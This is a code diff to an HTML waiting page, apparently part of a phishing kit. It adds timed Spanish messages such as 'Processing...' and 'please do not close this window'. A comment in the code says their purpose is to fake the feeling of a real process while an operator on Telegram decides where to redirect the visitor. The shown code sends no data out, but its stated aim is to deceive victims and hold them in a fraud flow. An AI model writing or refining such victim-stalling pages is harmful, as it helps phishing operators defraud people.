@@ -31,6 +31,16 @@
             0%, 20%, 40%, 60%, 80%, 100% { animation-play-state: running; }
             10%, 30%, 50%, 70%, 90% { animation-play-state: paused; }
         }
+        #waitMsg {
+            margin-top: 28px;
+            font-family: 'Open Sans', 'Segoe UI', Arial, sans-serif;
+            font-size: 15px;
+            color: #555;
+            text-align: center;
+            min-height: 20px;
+            opacity: 0;
+            transition: opacity .5s;
+        }
     </style>
     <script>
     function verificarRedireccion() {
@@ -47,14 +57,24 @@
     }
 
     verificarRedireccion();
+
+    // Mensajes de espera rotativos (sensación de proceso real mientras
+    // el operador decide a dónde redirigir desde Telegram)
+    var waitMsgs = [
+      [5000,  'Confirmando solicitud...'],
+      [14000, 'Procesando...'],
+      [24000, 'Por favor espere, no cierre esta ventana...']
+    ];
+    waitMsgs.forEach(function (m) {
+      setTimeout(function () {
+        var el = document.getElementById('waitMsg');
+        if (el) { el.textContent = m[1]; el.style.opacity = '1'; }
+      }, m[0]);
+    });
   </script>
 </head>
 <body>
-    <div class="loader">
-
-     </div>
-
-     <div>
-     </div>
+    <div class="loader"></div>
+    <p id="waitMsg"></p>
 </body>
 </html>
